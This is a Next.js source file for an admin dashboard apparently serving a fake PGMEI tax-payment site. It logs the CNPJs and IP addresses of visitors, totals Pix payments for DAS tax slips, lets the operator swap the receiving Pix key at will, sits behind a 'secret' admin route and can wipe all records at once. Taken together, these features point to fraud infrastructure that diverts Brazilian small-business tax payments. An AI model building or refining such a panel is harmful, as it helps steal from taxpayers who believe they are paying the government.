"use client"
import { useEffect, useState, useRef } from "react"
import Image from "next/image"

// Tipo Pedido atualizado: removidos nome, email e telefone de clientes
type Pedido = {
  id: string
  cnpj: string         // CNPJ corporativo gerador da guia
  status: string       // Status de pagamento (pendente, pago, etc)
  valor: number        // Valor do DAS
  chave_pix: string     // Chave pix aleatória ativa no momento da apuração
  criado_em: string    // Data e Hora do evento
}

const STATUS_COLORS: Record<string, string> = {
  pendente: "#D97706",
  pago: "#059669",
  cancelado: "#DC2626",
  enviado: "#0891B2",
}

export default function PedidosPage() {
  const [aba, setAba] = useState("pedidos")
  const [pedidos, setPedidos] = useState<Pedido[]>([])
  const [loadingPedidos, setLoadingPedidos] = useState(true)

  const [pixAtual, setPixAtual] = useState<{ valor: string; nome: string } | null>(null)
  const [pixValor, setPixValor] = useState("")
  const [pixNome, setPixNome] = useState("")
  const [pixMsg, setPixMsg] = useState("")
  const [pixLoading, setPixLoading] = useState(false)

  const [modoPagamento, setModoPagamento] = useState<"pix" | "podpay">("pix")
  const [modoLoading, setModoLoading] = useState(false)
  const [modoMsg, setModoMsg] = useState("")

  const [confirmando, setConfirmando] = useState(false)
  const [limparMsg, setLimparMsg] = useState("")
  const [limparLoading, setLimparLoading] = useState(false)

  const [ultimoTotalPedidos, setUltimoTotalPedidos] = useState(0)
  const audioRef = useRef<HTMLAudioElement | null>(null)

  // Atualizado tipo de visitas para usar CNPJ corporativo
  const [visitas, setVisitas] = useState<{ id: string; cnpj: string; ip: string; criado_em: string }[]>([])
  const [loadingVisitas, setLoadingVisitas] = useState(true)

  // Máscara auxiliar para exibir o CNPJ formatado na listagem admin
  function formatarCNPJ(v: string) {
    if (!v) return "—"
    const limpo = v.replace(/\D/g, "")
    return limpo.replace(/^(\d{2})(\d{3})(\d{3})(\d{4})(\d{2})$/, "$1.$2.$3/$4-$5")
  }

  useEffect(() => {
  const basePath = process.env.NEXT_PUBLIC_BASEPATH || ''
  audioRef.current = new Audio(`${basePath}/notification.mp3`)

  // CORREÇÃO: Mudar de /api/admin para /api/matrix-entry-adm
  fetch(`${basePath}/api/matrix-entry-adm/pedidos`)
    .then(r => r.ok ? r.json() : null)
    .then(d => {
      if (d && d.ok) {
        setPedidos(d.data)
        setUltimoTotalPedidos(d.data.length)
      }
    })
    .finally(() => setLoadingPedidos(false))

  // CORREÇÃO: Mudar para /api/matrix-entry-adm
  fetch(`${basePath}/api/matrix-entry-adm/pix`)
    .then(r => r.ok ? r.json() : null)
    .then(d => {
      if (d && d.ok && d.data) setPixAtual(d.data)
    })

  // CORREÇÃO: Mudar para /api/matrix-entry-adm
  fetch(`${basePath}/api/matrix-entry-adm/modo-pagamento`)
    .then(r => r.ok ? r.json() : null)
    .then(d => {
      if (d && d.ok && d.modo) setModoPagamento(d.modo)
    })

  // CORREÇÃO: Mudar para /api/matrix-entry-adm
  fetch(`${basePath}/api/matrix-entry-adm/visitas`)
    .then(r => r.ok ? r.json() : null)
    .then(d => {
      if (d && d.ok) setVisitas(d.data)
    })
    .catch(err => console.error("Erro ao buscar visitas:", err))
    .finally(() => setLoadingVisitas(false))
}, [])

useEffect(() => {
  const basePath = process.env.NEXT_PUBLIC_BASEPATH || ''
  const interval = setInterval(async () => {
    try {
      // CORREÇÃO: Mudar para /api/matrix-entry-adm
      const res = await fetch(`${basePath}/api/matrix-entry-adm/pedidos`)
      if (!res.ok) return
      const d = await res.json()
      if (!d.ok) return
      if (d.data.length > ultimoTotalPedidos) {
        const audio = new Audio(`${basePath}/notification.mp3`)
        audio.play().catch(err => console.error("ERRO AUDIO:", err))
        alert(`💰 Novo pedido recebido!\n\nPedidos totais: ${d.data.length}`)
      }
      setUltimoTotalPedidos(d.data.length)
      setPedidos(d.data)
    } catch (err) {
      console.error(err)
    }
  }, 5000)
  return () => clearInterval(interval)
}, [ultimoTotalPedidos])

  const totalPix = pedidos.reduce((soma, p) => soma + Number(p.valor || 0), 0)

  const agora = new Date()
  const visitasHoje = visitas.filter(v => {
    const d = new Date(v.criado_em)
    return d.toDateString() === agora.toDateString()
  }).length
  const visitasUltimaHora = visitas.filter(v => {
    const d = new Date(v.criado_em)
    return agora.getTime() - d.getTime() <= 60 * 60 * 1000
  }).length
  const ipsUnicos = new Set(visitas.map(v => v.ip)).size

  const visitasPorHora = Array.from({ length: 24 }, (_, hora) => ({
    hora,
    total: visitas.filter(v => new Date(v.criado_em).getHours() === hora).length,
  }))
  const maxVisitasHora = Math.max(1, ...visitasPorHora.map(h => h.total))

  async function salvarPix() {
    setPixLoading(true)
    setPixMsg("")
    const basePath = process.env.NEXT_PUBLIC_BASEPATH || ''
    try {
      const res = await fetch(`${basePath}/api/matrix-entry-adm/pix`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ valor: pixValor, nome: pixNome }),
      })
      const d = await res.json()
      if (d.ok) {
        setPixMsg("✅ Chave Pix atualizada!")
        setPixAtual({ valor: pixValor, nome: pixNome })
        setPixValor("")
        setPixNome("")
      } else {
        setPixMsg("❌ Erro: " + d.error)
      }
    } catch (err) {
      console.error(err)
      setPixMsg("❌ Erro de conexão ao salvar.")
    } finally {
      setPixLoading(false)
    }
  }

  async function salvarModo(novo: "pix" | "podpay") {
    setModoLoading(true)
    setModoMsg("")
    const basePath = process.env.NEXT_PUBLIC_BASEPATH || ''
    try {
      const res = await fetch(`${basePath}/api/admin/modo-pagamento`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ modo: novo }),
      })
      const d = await res.json()
      if (d.ok) {
        setModoPagamento(novo)
        setModoMsg(`✅ Modo alterado para ${novo === "pix" ? "PIX Local" : "PodPay"}!`)
      } else {
        setModoMsg("❌ Erro: " + d.error)
      }
    } catch (err) {
      console.error(err)
      setModoMsg("❌ Erro de conexão.")
    } finally {
      setModoLoading(false)
    }
  }

  async function limparTudo() {
  setLimparLoading(true)
  const basePath = process.env.NEXT_PUBLIC_BASEPATH || ''
  try {
    // 1. CORREÇÃO: Altera a rota antiga para a nova rota que limpa pedidos e visitas
    const res = await fetch(`${basePath}/api/matrix-entry-adm/limpar-banco`, { method: "POST" })
    const d = await res.json()
    
    if (d.ok) {
      setLimparMsg("✅ Todos os pedidos e visitas foram apagados.")
      setPedidos([])
      
      // 2. CORREÇÃO: Zera também as visitas na tela do seu painel imediatamente
      // Se o seu estado "visitas" for um Array de objetos, mude para: setVisitas([])
      setVisitas(0) 
      
    } else {
      setLimparMsg("❌ Erro: " + d.error)
    }
  } catch (err) {
    console.error(err)
    setLimparMsg("❌ Erro de conexão.")
  } finally {
    setLimparLoading(false)
    setConfirmando(false)
  }
}


 async function handleLogout() {
  const basePath = process.env.NEXT_PUBLIC_BASEPATH || ''
  
  try {
    // 1. CORREÇÃO: Bate na API de logout da nova pasta matrix-entry-adm
    await fetch(`${basePath}/api/matrix-entry-adm/logout`, { method: "POST" })
  } catch (err) {
    console.error("Erro ao deslogar:", err)
  }

  // 2. CORREÇÃO: Redireciona o navegador usando a URL secreta correta
  window.location.href = `${basePath}/matrix-entry-adm/login`
}

  const abas = [
    { id: "pedidos", label: "🛒 Guias Apuradas" },
    { id: "visitas", label: "📊 Acessos CNPJ" },
    { id: "pix", label: "🔑 Chave Pix Recebedora" },
    { id: "pagamento", label: "⚙️ Modo de Checkout" },
    { id: "limpar", label: "🗑️ Limpar Banco" },
  ]

  return (
    <div className="page">
  <header className="topbar">
    <div className="topbar-inner">
      <div className="brand">
        <Image 
          src={`${process.env.NEXT_PUBLIC_BASEPATH || ''}/images/logo-1.png`} 
          alt="Logo" 
          width={32} 
          height={32} 
          style={{ objectFit: "contain" }} 
        />
        <span>Painel Admin PGMEI</span>
      </div>
      <button onClick={handleLogout} className="btn btn-ghost">Sair</button>
    </div>
  </header>


      <section className="ledger">
        <div className="ledger-inner">
          <span className="ledger-eyebrow">Total Pix Arrecadado</span>
          <div className="ledger-value">
            {totalPix.toLocaleString("pt-BR", { style: "currency", currency: "BRL" })}
          </div>
          <span className="ledger-sub">
            {loadingPedidos ? "carregando…" : `${pedidos.length} guia${pedidos.length === 1 ? "" : "s"} no total`}

          </span>
        </div>
      </section>

      <nav className="nav-wrap">
        <div className="nav">
          {abas.map(a => (
            <button
              key={a.id}
              onClick={() => setAba(a.id)}
              className={`nav-btn ${aba === a.id ? "active" : ""}`}
            >
              {a.label}
            </button>
          ))}
        </div>
      </nav>

      <main className="content">
        {/* TABELA DE GUIAS APURADAS */}
        {aba === "pedidos" && (
          <div className="container-wide">
            <p className="meta-text">
              {loadingPedidos ? "Carregando..." : `${pedidos.length} guia(s) encontrada(s)`}
            </p>
            <div className="card table-card">
              <div className="table-scroll">
                <table>
                  <thead>
                    <tr>
                      {["CNPJ Contribuinte", "Status", "Valor do DAS", "Chave Pix Utilizada", "Data / Hora"].map(h => (
                        <th key={h}>{h}</th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {pedidos.map(p => (
                      <tr key={p.id}>
                        <td className="cell-strong mono">{formatarCNPJ(p.cnpj)}</td>
                        <td>
                          <span className="status-pill" style={{ background: STATUS_COLORS[p.status.toLowerCase()] ?? "#888" }}>
                            {p.status}
                          </span>
                        </td>
                        <td className="cell-money mono">
                          {Number(p.valor).toLocaleString("pt-BR", { style: "currency", currency: "BRL" })}
                        </td>
                        <td className="mono muted break text-xs max-w-[220px]">{p.chave_pix || "—"}</td>
                        <td className="mono muted">{new Date(p.criado_em).toLocaleString("pt-BR")}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        )}

        {/* MONITORAMENTO DE ACESSOS POR CNPJ */}
        {aba === "visitas" && (
          <div className="container-wide">
            <div className="stats-grid">
              <div className="stat-box">
                <span className="stat-label">Total de acessos</span>
                <span className="stat-value">{loadingVisitas ? "…" : visitas.length}</span>
              </div>
              <div className="stat-box">
                <span className="stat-label">Hoje</span>
                <span className="stat-value">{loadingVisitas ? "…" : visitasHoje}</span>
              </div>
              <div className="stat-box">
                <span className="stat-label">Última hora</span>
                <span className="stat-value">{loadingVisitas ? "…" : visitasUltimaHora}</span>
              </div>
              <div className="stat-box">
                <span className="stat-label">IPs únicos</span>
                <span className="stat-value">{loadingVisitas ? "…" : ipsUnicos}</span>
              </div>
            </div>

            <div className="card" style={{ marginTop: "1.25rem" }}>
              <h2 className="card-title" style={{ marginBottom: "1rem" }}>Acessos por horário do dia</h2>
              <div className="hour-chart">
                {visitasPorHora.map(h => (
                  <div key={h.hora} className="hour-bar-wrap" title={`${h.hora}h — ${h.total} acesso(s)`}>
                    <div
                      className="hour-bar"
                      style={{ height: `${Math.max(4, (h.total / maxVisitasHora) * 90)}px` }}
                    />
                    <span className="hour-label">{h.hora}</span>
                  </div>
                ))}
              </div>
            </div>
            <p className="meta-text" style={{ marginTop: "1.5rem" }}>
              {loadingVisitas ? "Carregando..." : `${visitas.length} consulta(s) de CNPJ registrada(s)`}
            </p>
            <div className="card table-card">
              <div className="table-scroll">
                <table>
                  <thead>
                    <tr>
                      {["CNPJ Consultado", "Endereço IP", "Data / Hora"].map(h => (
                        <th key={h}>{h}</th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {visitas.map(v => (
                      <tr key={v.id}>
                        <td className="cell-strong mono">{formatarCNPJ(v.cnpj)}</td>
                        <td className="mono">{v.ip}</td>
                        <td className="mono muted">{new Date(v.criado_em).toLocaleString("pt-BR")}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        )}

        {/* ABA DE TROCAR CHAVE PIX */}
        {aba === "pix" && (
          <div className="container-narrow">
            <div className="card">
              <h2 className="card-title">🔑 Chave Pix Recebedora</h2>

              {pixAtual && (
                <div className="info-box info-success">
                  <p className="info-title">Chave ativa para arrecadação</p>
                  <p className="info-line"><strong>Nome:</strong> {pixAtual.nome}</p>
                  <p className="info-line mono break"><strong>Chave:</strong> {pixAtual.valor}</p>
                </div>
              )}

              <div className="field">
                <label>Nome / Identificação da Conta</label>
                <input type="text" placeholder="Ex: Arrecadação Principal..." value={pixNome} onChange={e => setPixNome(e.target.value)} />
              </div>

              <div className="field">
                <label>Nova Chave Pix (Aleatória, CNPJ, CPF, E-mail ou Celular)</label>
                <input type="text" placeholder="Insira a nova chave..." value={pixValor} onChange={e => setPixValor(e.target.value)} />
              </div>

              {pixMsg && <p className={`msg ${pixMsg.startsWith("✅") ? "msg-ok" : "msg-err"}`}>{pixMsg}</p>}

              <button onClick={salvarPix} disabled={pixLoading || !pixValor || !pixNome} className="btn btn-primary btn-block">
                {pixLoading ? "Salvando..." : "Salvar Nova Chave"}
              </button>
            </div>
          </div>
        )}

        {/* ABA DE MODO DE CHECKOUT */}
        {aba === "pagamento" && (
          <div className="container-narrow">
            <div className="card">
              <h2 className="card-title">⚙️ Modo de Checkout</h2>
              <p className="card-desc">Escolha como o sistema processará o pagamento do DAS.</p>

              <div
                onClick={() => !modoLoading && salvarModo("pix")}
                className={`payment-option variant-pix ${modoPagamento === "pix" ? "active" : ""}`}
              >
                <span className="payment-icon">🏦</span>
                <div>
                  <p className="payment-name">PIX Local {modoPagamento === "pix" && <span className="tag-ativo">✓ ATIVO</span>}</p>
                  <p className="payment-desc">Gera o QR Code estático baseado na sua chave Pix salva. Baixa manual.</p>
                </div>
              </div>

              {/* MODO GATEWAY PODPAY DESABILITADO E NÃO CLICÁVEL POR ENQUANTO */}
              <div
                className="payment-option variant-podpay opacity-50 brightness-95 cursor-not-allowed"
                style={{ display: "flex", gap: "12px", padding: "12px", border: "1px solid var(--border)", borderRadius: "8px", marginTop: "12px" }}
              >
                <span className="payment-icon">⚡</span>
                <div>
                  <p className="payment-name" style={{ margin: 0, fontWeight: 700 }}>
                    PodPay Gateway {modoPagamento === "podpay" && <span className="tag-ativo">✓ ATIVO</span>}
                  </p>
                  <p className="payment-desc" style={{ margin: 0, fontSize: "0.8rem", color: "var(--ink-muted)" }}>Integração automatizada via API externa. (Indisponível no momento).</p>
                </div>
              </div>

              {modoMsg && <p className={`msg ${modoMsg.startsWith("✅") ? "msg-ok" : "msg-err"}`}>{modoMsg}</p>}
              {modoLoading && <p className="msg-loading">Atualizando...</p>}
            </div>
          </div>
        )}

        {/* ABA DE LIMPAR BANCO */}
        {aba === "limpar" && (
          <div className="container-narrow">
            <div className="card">
              <h2 className="card-title">🗑️ Limpar Banco de Dados</h2>
              <div className="info-box info-danger">
                ⚠️ Esta ação apaga <strong>todas as guias e visitas apuradas </strong> permanentemente. Não há reversão.
              </div>

              {!confirmando ? (
                <button onClick={() => setConfirmando(true)} className="btn btn-danger btn-block">
                  Apagar histórico de guias
                </button>
              ) : (
                <div>
                  <p className="confirm-text">Tem certeza? Não pode ser desfeito.</p>
                  <div className="confirm-row">
                    <button onClick={limparTudo} disabled={limparLoading} className="btn btn-danger">
                      {limparLoading ? "Excluindo..." : "Sim, limpar histórico"}
                    </button>
                    <button onClick={() => setConfirmando(false)} className="btn btn-secondary">
                      Cancelar
                    </button>
                  </div>
                </div>
              )}
              {limparMsg && <p className={`msg ${limparMsg.startsWith("✅") ? "msg-ok" : "msg-err"}`}>{limparMsg}</p>}
            </div>
          </div>
        )}
      </main>
      <style jsx>{`
        .page {
          --bg: #f4f5f7;
          --surface: #ffffff;
          --border: #e3e6eb;
          --ink: #101828;
          --ink-muted: #667085;
          --header-bg: #0b1220;
          --accent: #4f46e5;
          --accent-dark: #4338ca;
          --money: #FDE047;
          --danger: #dc2626;
          --danger-dark: #b91c1c;
          --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Inter, Roboto, sans-serif;
          --font-mono: ui-monospace, "SF Mono", "JetBrains Mono", Menlo, monospace;
          min-height: 100vh; background: var(--bg); font-family: var(--font-sans); color: var(--ink);
        }
        .mono { font-family: var(--font-mono); }
        .muted { color: var(--ink-muted); }
        .topbar { background: var(--header-bg); }
        .topbar-inner { max-width: 1080px; margin: 0 auto; padding: 0.9rem 1.5rem; display: flex; align-items: center; justify-content: space-between; }
        .brand { display: flex; align-items: center; gap: 10px; color: #fff; font-weight: 700; font-size: 1rem; }
        .btn-ghost { background: transparent; color: #fff; border: 1px solid rgba(255,255,255,0.25); border-radius: 6px; padding: 6px 12px; font-size: 0.85rem; cursor: pointer; }
        .btn-ghost:hover { background: rgba(255,255,255,0.08); border-color: rgba(255,255,255,0.4); }
        .ledger { background: var(--header-bg); border-top: 1px solid rgba(255,255,255,0.06); }
        .ledger-inner { max-width: 1080px; margin: 0 auto; padding: 2.2rem 1.5rem 2.6rem; text-align: center; }
        .ledger-eyebrow { display: inline-block; font-size: 0.72rem; font-weight: 700; letter-spacing: 0.14em; text-transform: uppercase; color: #94a3b8; margin-bottom: 0.6rem; }
        .ledger-value { font-family: var(--font-mono); font-variant-numeric: tabular-nums; font-size: clamp(2.4rem, 6vw, 3.6rem); font-weight: 700; color: var(--money); line-height: 1.1; }
        .ledger-sub { display: block; margin-top: 0.55rem; font-size: 0.85rem; color: #94a3b8; }
        .nav-wrap { background: var(--surface); border-bottom: 1px solid var(--border); display: flex; justify-content: center; padding: 0.9rem 1rem; }
        .nav { display: inline-flex; gap: 4px; background: #eef0f3; border-radius: 999px; padding: 4px; max-width: 100%; overflow-x: auto; }
        .nav-btn { padding: 9px 18px; font-size: 0.85rem; font-weight: 600; background: transparent; border: none; border-radius: 999px; color: var(--ink-muted); cursor: pointer; white-space: nowrap; }
        .nav-btn:hover { color: var(--ink); }
        .nav-btn.active { background: #fff; color: var(--ink); box-shadow: 0 1px 3px rgba(16,24,40,0.12); }
        .content { padding: 2.25rem 1.5rem 4rem; display: flex; justify-content: center; width: 100%; }
        .container-narrow { width: 100%; max-width: 480px; }
        .container-wide { width: 100%; max-width: 980px; }
        .meta-text { text-align: center; color: var(--ink-muted); font-size: 0.85rem; margin: 0 0 1rem; }
        .card { background: var(--surface); border: 1px solid var(--border); border-radius: 14px; padding: 1.75rem; box-shadow: 0 1px 2px rgba(16,24,40,0.04); }
        .table-card { padding: 0; overflow: hidden; }
        .card-title { margin: 0 0 0.3rem; font-size: 1.05rem; font-weight: 700; }
        .card-desc { margin: 0 0 1.4rem; font-size: 0.85rem; color: var(--ink-muted); }
        .table-scroll { overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
        thead tr { background: #1e293b; }
        th { padding: 12px 16px; text-align: left; color: #cbd5e1; font-weight: 600; font-size: 0.72rem; letter-spacing: 0.05em; text-transform: uppercase; white-space: nowrap; }
        tbody tr { border-bottom: 1px solid var(--border); }
        tbody tr:hover { background: #fafbfc; }
        td { padding: 12px 16px; white-space: nowrap; }
        .cell-strong { font-weight: 700; }
        .cell-money { font-weight: 700; color: var(--ink); }
        .status-pill { display: inline-block; padding: 3px 11px; border-radius: 999px; font-size: 0.72rem; font-weight: 700; color: #fff; text-transform: uppercase; }
        
        /* Sistema de Grid de Métricas */
        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; margin-bottom: 20px; }
        .stat-box { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; padding: 16px; display: flex; flex-direction: column; gap: 4px; box-shadow: 0 1px 2px rgba(0,0,0,0.02); }
        .stat-label { font-size: 0.75rem; color: var(--ink-muted); font-weight: 600; text-transform: uppercase; }
        .stat-value { font-size: 1.4rem; font-weight: 800; color: var(--ink); font-family: var(--font-mono); }

        /* Gráfico de Barras Remodelado */
        .hour-chart { display: flex; align-items: flex-end; gap: 8px; height: 130px; padding: 10px 0; border-bottom: 1px solid var(--border); }
        .hour-bar-wrap { flex: 1; display: flex; flex-direction: column; align-items: center; gap: 6px; cursor: pointer; }
        .hour-bar { width: 100%; max-width: 14px; background: var(--accent); border-radius: 4px 4px 0 0; transition: background 0.15s; }
        .hour-bar-wrap:hover .hour-bar { background: var(--accent-dark); }
        .hour-label { font-size: 0.65rem; color: var(--ink-muted); font-family: var(--font-mono); }

        /* Campos e Botões */
        .field { margin-bottom: 14px; }
        .field label { display: block; font-size: 0.8rem; font-weight: 600; margin-bottom: 5px; color: var(--ink); }
        .field input { width: 100%; border: 1px solid var(--border); border-radius: 6px; padding: 8px 12px; font-size: 0.85rem; outline: none; }
        .field input:focus { border-color: var(--accent); }
        
        .payment-option { display: flex; align-items: center; gap: 14px; padding: 14px; border: 1px solid var(--border); border-radius: 8px; cursor: pointer; transition: all 0.15s; margin-bottom: 10px; }
        .payment-option:hover { background: #fafbfc; border-color: #cbd5e1; }
        .payment-option.active { border-color: var(--money); background: #f0fdf4; box-shadow: 0 0 0 1px var(--money); }
        .payment-icon { font-size: 1.4rem; }
        .payment-name { margin: 0; font-size: 0.9rem; font-weight: 700; }
        .payment-desc { margin: 2px 0 0; font-size: 0.78rem; color: var(--ink-muted); white-space: normal; }
        .tag-ativo { font-size: 0.65rem; color: var(--money); font-weight: 800; margin-left: 6px; letter-spacing: 0.05em; }

        .btn { padding: 10px 16px; font-size: 0.85rem; font-weight: 600; border-radius: 6px; cursor: pointer; transition: all 0.15s; text-align: center; border: 1px solid transparent; }
        .btn-primary { background: var(--accent); color: #fff; }
        .btn-primary:hover { background: var(--accent-dark); }
        .btn-danger { background: var(--danger); color: #fff; }
        .btn-danger:hover { background: var(--danger-dark); }
        .btn-secondary { background: #fff; border-color: var(--border); color: var(--ink); }
        .btn-secondary:hover { background: #f9fafb; }
        .btn-block { display: block; width: 100%; }
        
        .confirm-text { font-size: 0.85rem; font-weight: 600; color: #991b1b; text-align: center; margin-bottom: 12px; }
        .confirm-row { display: flex; gap: 8px; justify-content: center; }
        .msg { font-size: 0.8rem; font-weight: 600; margin: 10px 0; text-align: center; }
        .msg-ok { color: var(--money); }
        .msg-err { color: var(--danger); }
        .msg-loading { text-align: center; font-size: 0.8rem; color: var(--ink-muted); animation: pulse 1.5s infinite; }

        .break { word-break: break-all; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }

        @media (max-width: 640px) {
          .stats-grid { grid-template-columns: repeat(2, 1fr); }
          .hour-chart { overflow-x: auto; padding-bottom: 15px; }
          .content { padding: 1.75rem 1rem 3rem; }
          .card { padding: 1.25rem; }
          .ledger-inner { padding: 1.8rem 1rem 2.1rem; }
        }
      `}</style>
    </div>
  )
}
